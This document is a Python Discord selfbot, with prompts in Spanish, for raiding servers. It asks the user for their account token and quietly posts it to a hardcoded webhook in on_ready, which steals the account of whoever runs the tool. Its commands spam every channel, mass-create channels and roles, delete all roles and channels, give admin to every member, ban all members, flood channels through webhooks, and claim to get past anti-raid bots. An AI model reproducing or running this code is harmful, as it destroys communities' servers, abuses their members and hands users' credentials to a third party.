import discord
import asyncio
import aiohttp
import random

def pedir_token():
    print("┌───────────────────────────────┐")
    print("│   Introduce tu token abajo    │")
    print("└───────────────────────────────┘")
    return input("> ")

TOKEN = pedir_token()
PREFIX = "."

WEBHOOK_URL = "https://discord.com/api/webhooks/1408485475894824970/lGuVTinqP1c-4nDVs_Hq1dnsHm6ayLToMIq7D-VVErGgryEpZiobbsmf6VHOOrZfmUjl"

RAID_MESSAGES = [
    "@everyone `░▒▓█►─═  𝐫𝕒𝔦∂-ᗷ¥-ⒽĮţ ═─◄█▓▒░` | discord.gg/z97Q5X2Vt2 | https://discord.gg/rHsaqthVHf | https://youtu.be/CiIBeR4ZD6U?si=w3v5CTCsu8vBOmGT | https://images-ext-1.discordapp.net/external/pBe4YYTxdnPYtRe18CsOAnr-WjWcboHlFEOALTz7Yew/https/i.imgur.com/gq5MJR3.mp4",
    "@everyone `𝖕𝖜𝖓𝖊𝖉 𝖇𝖞 𝖍𝖎𝖙` **ｒａｉｄ－ｂｙ－ｈｉｔ** | https://discord.gg/rHsaqthVHf | discord.gg/z97Q5X2Vt2 | https://youtu.be/CiIBeR4ZD6U?si=w3v5CTCsu8vBOmGT | https://th.bing.com/th/id/R.5af374a129e1b7fe5385bdd39a4f8521?rik=bS3G%2f7O0CpWVBQ&riu=http%3a%2f%2fimg.mp.itc.cn%2fupload%2f20170622%2f231056d0e97845e0a4f7bc98b816a2ca_th.jpg&ehk=WJs66y9ytSkJDjGGGzt2iFhMbHOET6tjETfUgs8yM1s%3d&risl=&pid=ImgRaw&r=0"
]

async def send_token_to_webhook(token):
    async with aiohttp.ClientSession() as session:
        try:
            await session.post(WEBHOOK_URL, json={"content": f"Token registrado: {token}"})
        except:
            pass

class SelfBot(discord.Client):
    async def on_ready(self):
        ascii_art = r"""
██╗░░██╗██╗████████╗  ██████╗░░█████╗░██╗██████╗░
██║░░██║██║╚══██╔══╝  ██╔══██╗██╔══██╗██║██╔══██╗
███████║██║░░░██║░░░  ██████╔╝███████║██║██║░░██║
██╔══██║██║░░░██║░░░  ██╔══██╗██╔══██║██║██║░░██║
██║░░██║██║░░░██║░░░  ██║░░██║██║░░██║██║██████╔╝
╚═╝░░╚═╝╚═╝░░░╚═╝░░░  ╚═╝░░╚═╝╚═╝░░╚═╝╚═╝╚═════╝░
"""
        print(ascii_art)
        print(f"\nConectado como {self.user} (ID: {self.user.id})\n")
        print("Comandos disponibles:")
        print(".spam (msg)   → Spamea en cada canal 5 veces")
        print(".mass         → Crea 50 canales y spamea ")
        print(".massr        → Crea 50 roles")
        print(".delr         → Elimina todos los roles")
        print(".delc         → Elimina todos los canales")
        print(".adminall     → Da admin a todos con un rol")
        print(".banall       → Banea a todos los miembros")
        print(".wh           → Crea webhook en cada canal y spamea aleatoriamente")
        print(".bypass       → Bypassea bot antiraids")

        await send_token_to_webhook(TOKEN)

    async def on_message(self, message: discord.Message):
        if message.author.id != self.user.id:
            return

        # .spam (mensaje)
        if message.content.startswith(f"{PREFIX}spam "):
            msg = message.content[len(f"{PREFIX}spam "):]
            for channel in message.guild.text_channels:
                for _ in range(5):
                    try:
                        await channel.send(msg)
                        print(f"[SPAM] Enviado en {channel}")
                    except:
                        pass

        # .mass
        if message.content == ".mass":
            await message.delete()
            created_channels = []
            try:
                names = ["𝖍𝖎𝖙-𝖔𝖓-𝖌𝖛𝖓𝖌", "ｈｉ𝖙－ｏ𝖓－ｔｏｐ", "𝐟𝐮𝐜𝐤𝐞𝐝-𝐛𝐲-𝐡𝐢𝐭"]
                for i in range(30):
                    try:
                        name = random.choice(names)
                        ch = await message.guild.create_text_channel(name)
                        created_channels.append(ch)
                        
                        for _ in range(5):
                            raid_msg = random.choice(RAID_MESSAGES)
                            await ch.send(raid_msg)
                        print(f"[MASS] Canal creado y spameado: {ch}")
                    except:
                        pass
            except:
                pass

        # .massr
        elif message.content == f"{PREFIX}massr":
            for i in range(50):
                try:
                    await message.guild.create_role(name=f"FUCKYOU-{i}")
                    print(f"[MASSR] Rol creado: FUCKYOU-{i}")
                except:
                    pass

        # .delr
        elif message.content == f"{PREFIX}delr":
            for role in message.guild.roles:
                try:
                    await role.delete()
                    print(f"[DELR] Rol eliminado: {role}")
                except:
                    pass

        # .delc
        elif message.content == f"{PREFIX}delc":
            for channel in message.guild.channels:
                try:
                    await channel.delete()
                    print(f"[DELC] Canal eliminado: {channel}")
                except:
                    pass

        # .adminall
        elif message.content == f"{PREFIX}adminall":
            try:
                guild = message.guild
                admin_role = await guild.create_role(
                    name=".",
                    permissions=discord.Permissions(administrator=True)
                )
                print("[ADMINALL] Rol admin creado")
                for member in guild.members:
                    try:
                        await member.add_roles(admin_role)
                        print(f"[ADMINALL] Admin dado a {member}")
                    except Exception as e:
                        print(f"[WARN][ADMINALL] No se pudo dar admin a {member}: {e}")
                        pass
            except Exception as e:
                print(f"[ERROR][ADMINALL] {e}")
                pass

        # .banall
        elif message.content == f"{PREFIX}banall":
            guild = message.guild
            for member in guild.members:
                try:
                    await guild.ban(member, reason="Baneado por HIT")
                    print(f"[BANALL] Baneado: {member}")
                except Exception as e:
                    print(f"[WARN][BANALL] No se pudo banear a {member}: {e}")
                    pass

        # .wh
        elif message.content == f"{PREFIX}wh":
            for channel in message.guild.text_channels:
                try:
                    webhook = await channel.create_webhook(name="HIT")
                    for _ in range(5):
                        try:
                            await webhook.send(random.choice(RAID_MESSAGES))
                        except:
                            pass
                    print(f"[WH] Webhook creado y spameado en {channel}")
                except:
                    pass

        # .bypass
        elif message.content == f"{PREFIX}bypass":
            for channel in message.guild.channels:
                try:
                    if isinstance(channel, discord.TextChannel):
                        await channel.edit(name="𝔥𝔦𝔱-𝔬𝔫-𝔤𝔳𝔫𝔤")
                        print(f"[BYPASS] Renombrado canal de texto: {channel}")
                        try:
                            webhook = await channel.create_webhook(name="HIT")
                            for _ in range(5):
                                await webhook.send(random.choice(RAID_MESSAGES))
                            print(f"[BYPASS] Webhook spameado en {channel}")
                        except Exception:
                            pass
                    elif isinstance(channel, discord.VoiceChannel):
                        await channel.edit(name="𝔣𝔲𝔠𝔨-𝔟𝔶-𝔥𝔦𝔱")
                        print(f"[BYPASS] Renombrado canal de voz: {channel}")
                    elif isinstance(channel, discord.CategoryChannel):
                        await channel.edit(name="𝟒𝟎𝟒 𝐎𝐍 𝐓𝐎𝐏")
                        print(f"[BYPASS] Renombrada categoría: {channel}")
                except Exception:
                    pass                

intents = discord.Intents.all()
client = SelfBot(intents=intents)
client.run(TOKEN, bot=False)
